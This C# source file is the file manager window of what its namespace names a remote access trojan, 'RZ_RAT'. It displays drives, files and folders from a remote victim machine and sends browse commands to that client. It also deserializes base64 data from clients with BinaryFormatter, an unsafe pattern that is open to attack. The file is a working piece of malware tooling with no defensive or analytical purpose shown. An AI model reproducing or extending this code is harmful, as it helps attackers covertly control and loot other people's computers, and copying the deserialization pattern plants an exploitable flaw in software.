using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.Serialization;
using System.Runtime.Serialization.Formatters.Binary;
using System.Text;
using System.Windows.Forms;

namespace RZ_RAT
{
    public partial class FileManger : Form
    {
        public object decode(string base64String)
        {
            byte[] bytes = Convert.FromBase64String(base64String);
            using (MemoryStream ms = new MemoryStream(bytes, 0, bytes.Length))
            {
                ms.Write(bytes, 0, bytes.Length);
                ms.Position = 0;
                return new BinaryFormatter().Deserialize(ms);
            }
        }
        public int index_;
        public List<helper.FileManger.files> ListF = null;
        public FileManger(int index)
        {
            index_ = index;
            InitializeComponent();
        }


        private void FileManger_Load(object sender, EventArgs e)
        {

        }
        public void AddDrivers_(string[] drivers)
        {
            foreach (string i in drivers)
            {
                ListViewItem lvii = new ListViewItem("", 3);
                lvii.SubItems.Add(i);
                lvii.SubItems.Add(" ");
                lvii.Tag = i;
                if(!(string.IsNullOrEmpty(i)))
                    this.Invoke((MethodInvoker)delegate{listView1.Items.Add(lvii);});

            }
        }
        public void addtolistview()
        {
            this.Invoke((MethodInvoker)delegate
                         { listView1.Items.Clear(); });
            foreach (helper.FileManger.files i in ListF)
            {
                switch (i.type)
                {
                    case "file":
                        ListViewItem lvii = new ListViewItem("", 0);
                        lvii.SubItems.Add(i.name);
                        lvii.SubItems.Add(i.size);
                        lvii.Tag = i.path;
                        this.Invoke((MethodInvoker)delegate
                        {
                            listView1.Items.Add(lvii);
                        });
                        break ;
                    case "folder":
                        ListViewItem lvii_ = new ListViewItem("", 1);
                        lvii_.SubItems.Add(i.name);
                        lvii_.SubItems.Add(i.size);
                        lvii_.Tag = i.path;
                        this.Invoke((MethodInvoker)delegate
                        {
                            listView1.Items.Add(lvii_);
                        });
                        break;
                }
            }
            
         
       
        }
        private void listView1_DoubleClick(object sender, EventArgs e)
        {
            string path = (string)listView1.SelectedItems[0].Tag;
            Form1.ServerObject.ClientsObjs[index_].addCommand("filesandfolders", path);
        }

        private void FileManger_FormClosing(object sender, FormClosingEventArgs e)
        {
            Form1.ServerObject.ClientsObjs[index_].FM = null;
        }
    }
}
